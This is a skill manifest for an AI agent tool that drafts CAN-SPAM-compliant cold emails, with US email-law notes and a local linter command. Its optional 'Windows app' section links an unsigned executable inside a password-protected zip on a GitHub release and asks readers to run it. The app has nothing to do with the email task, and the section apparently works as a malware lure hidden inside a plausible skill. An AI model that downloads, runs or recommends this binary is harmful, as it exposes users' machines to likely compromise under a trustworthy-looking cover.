---
name: cold-email-writer
description: Drafts compliant US cold emails from a prospect brief, with the CAN-SPAM header, subject, address and opt-out lines checked before a rep sends. Use when the user asks for cold email writer, can spam cold email template, b2b cold outreach email. For US B2B sales reps and demand generation teams that send cold email.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Cold Email Writer

**Drafts compliant US cold emails from a prospect brief, with the CAN-SPAM header, subject, address and opt-out lines checked before a rep sends.** Written for US B2B sales reps and demand generation teams that send cold email.

Use this skill when someone asks for:

- cold email writer
- can spam cold email template
- b2b cold outreach email
- cold email subject line

---

## The job

Reps write cold emails in a hurry, so messages ship without a physical address, a real opt-out or an honest subject line, and the sending domain gets flagged.

## What you get

1. Collect the sender details, the trigger, one proof point and the ask.
2. Write the message as four short blocks: why now, the value, the proof, the ask.
3. Add the physical postal address, the opt-out line and an accurate subject line.
4. Run the compliance linter and fix every element it flags before the draft moves on.

Output contract:

- email_body - the full message with the address and the opt-out line in place
- subject_lines - three accurate subjects with no fake Re: or Fwd: prefix
- element_check - each CAN-SPAM element marked present or missing
- claim_flags - claims that need a source or an approval before sending

## US specifics that matter

- CAN-SPAM (15 USC 7701-7713) applies to commercial email and does not exempt B2B messages.
- A CAN-SPAM message needs truthful From, To and Reply-To headers, a non-deceptive subject, the sender's valid physical postal address and a clear opt-out that is honored within 10 business days.
- CAN-SPAM's harvested-address provision (7704(a)(4)(iii)) restricts sending to addresses gathered from directories or bought lists.
- Gmail treats 5,000 or more messages a day on one domain as bulk sending, and those senders must publish SPF, DKIM and DMARC records and support one-click unsubscribe.
- California, Colorado, Connecticut, Utah and Virginia require consent for some commercial email, which is stricter than CAN-SPAM.

## Guardrails (hard rules)

- Never send the email or connect to a mail server; a rep sends from the company's own mailbox.
- Never use harvested, guessed or bought email addresses, and never guess a personal address from a name pattern.
- Never invent a metric, a customer name or a mutual connection to make the email sound personal.
- Never promise a discount, a demo slot or a price that the deal owner has not approved.

## Quickstart

### 1. Fill in the brief

`templates/cold-email-brief.yaml` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/lint_cold_email.py --input cold-email-brief.yaml --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/cold-email-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**The elements a commercial email needs**

- From, To and Reply-To must identify the real sender and must not be false or misleading.
- The subject line must not be false or misleading and must not fake a Re: or Fwd: prefix.
- The message must carry the sender's valid physical postal address.
- The opt-out must be clear, must work without hoops and must be honored within 10 business days.

**Inbox rules that are not statute**

- Gmail requires bulk senders to publish SPF, DKIM and DMARC records and to support one-click unsubscribe.
- Gmail expects a bulk sender's spam rate to stay below 0.3 percent.
- Microsoft 365 judges high-volume senders on authentication and complaint rates, not on volume alone.
- A mailbox that sends the same message to the same person twice degrades fast; one follow-up, then stop.

**State law and records**

- California, Colorado, Connecticut, Utah and Virginia require consent for some commercial email, not just opt-out.
- Keep one suppression list and check it before every send.
- Record date, time in ET, the source of the address and the exact copy sent for each contact.
- Text messages are governed by TCPA and generally need prior express written consent.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/cold-email-rules.md` - CAN-SPAM rules that decide whether the email lands
- `templates/cold-email-brief.yaml` - the brief to fill in
- `scripts/lint_cold_email.py` - the working script

## Verify the bundle

```bash
python3 scripts/lint_cold_email.py --input cold-email-brief.yaml --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
